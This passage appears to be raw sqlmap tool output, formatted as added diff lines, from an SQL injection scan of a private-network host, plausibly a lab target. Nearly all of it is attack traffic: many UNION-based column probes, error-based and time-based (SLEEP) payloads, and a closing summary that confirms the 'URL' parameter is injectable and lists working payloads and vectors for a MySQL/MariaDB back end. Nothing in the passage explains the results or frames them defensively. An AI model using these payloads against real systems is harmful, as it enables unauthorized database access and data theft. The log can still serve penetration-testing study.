+[21:21:00] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:21:00] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:00] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:21:00] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:00] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:21:01] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:01] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:21:01] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:01] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:21:01] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:01] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+[21:21:01] [PAYLOAD] -5462' UNION ALL SELECT 1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265,1265#
+[21:21:02] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:02] [PAYLOAD] -8579' UNION ALL SELECT 4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050,4050#
+[21:21:02] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:02] [PAYLOAD] -4272' UNION ALL SELECT 4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136,4136#
+[21:21:02] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:02] [PAYLOAD] -5343' UNION ALL SELECT 9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380,9380#
+[21:21:03] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:03] [PAYLOAD] -9347' UNION ALL SELECT 7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080,7080#
+[21:21:03] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:03] [PAYLOAD] -4098' UNION ALL SELECT 5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533,5533#
+[21:21:03] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:03] [PAYLOAD] -1936' UNION ALL SELECT 7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857,7857#
+[21:21:04] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:04] [PAYLOAD] -2938' UNION ALL SELECT 9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339,9339#
+[21:21:04] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:04] [PAYLOAD] -1055' UNION ALL SELECT 6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983,6983#
+[21:21:04] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:04] [PAYLOAD] -4325' UNION ALL SELECT 6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424,6424#
+[21:21:04] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:04] [PAYLOAD] -4855' UNION ALL SELECT 7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319,7319#
+[21:21:05] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:05] [PAYLOAD] -8936' UNION ALL SELECT 5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767,5767#
+[21:21:05] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:05] [PAYLOAD] -4720' UNION ALL SELECT 9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735,9735#
+[21:21:05] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:05] [PAYLOAD] -8126' UNION ALL SELECT 7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957#
+[21:21:06] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:06] [PAYLOAD] -5474' UNION ALL SELECT 8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161,8161#
+[21:21:06] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:06] [PAYLOAD] -4858' UNION ALL SELECT 6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513,6513#
+[21:21:06] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:06] [PAYLOAD] -1716' UNION ALL SELECT 4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849,4849#
+[21:21:07] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:07] [PAYLOAD] -3696' UNION ALL SELECT 2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941,2941#
+[21:21:07] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:07] [PAYLOAD] -3662' UNION ALL SELECT 8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432,8432#
+[21:21:07] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:07] [PAYLOAD] -7389' UNION ALL SELECT 8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045,8045#
+[21:21:07] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:08] [DEBUG] checking for parameter length constraining mechanisms
+[21:21:08] [PAYLOAD] test' AND (SELECT 1976 FROM(SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT (CASE WHEN (1049=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                1049) THEN 1 ELSE 0 END)),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CwMl
+[21:21:08] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:08] [DEBUG] performed 1 query in 0.46 seconds
+[21:21:08] [DEBUG] checking for filtered characters
+GET parameter 'URL' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 426 HTTP(s) requests:
+---
+Parameter: URL (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: URL=test' RLIKE (SELECT (CASE WHEN (2039=2039) THEN 0x74657374 ELSE 0x28 END))-- iZuB
+    Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: URL=test' AND (SELECT 9995 FROM(SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT (ELT(9995=9995,1))),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Qqrq
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: URL=test' AND (SELECT 3211 FROM (SELECT(SLEEP(5)))iduw)-- tBUx
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+---
+[21:21:42] [INFO] the back-end DBMS is MySQL
+[21:21:42] [DEBUG] searching for error chunk length...
+[21:21:42] [PAYLOAD] test' AND (SELECT 5377 FROM(SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT REPEAT(0x34,1024)),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CyRW
+[21:21:42] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[21:21:43] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:43] [PAYLOAD] test' AND (SELECT 9593 FROM(SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT REPEAT(0x32,512)),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DzgK
+[21:21:43] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:43] [PAYLOAD] test' AND (SELECT 6696 FROM(SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT REPEAT(0x36,256)),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- GLtZ
+[21:21:43] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:43] [PAYLOAD] test' AND (SELECT 2667 FROM(SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT REPEAT(0x31,51)),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jIeb
+[21:21:44] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:44] [PAYLOAD] test' AND (SELECT 1322 FROM(SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT (CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END)),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- RomK
+[21:21:44] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:21:45] [DEBUG] performed 5 queries in 2.18 seconds
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[21:21:45] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 270 times
+[21:21:45] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.240.127'
+
+[*] ending @ 21:21:45 /2025-03-26/
+
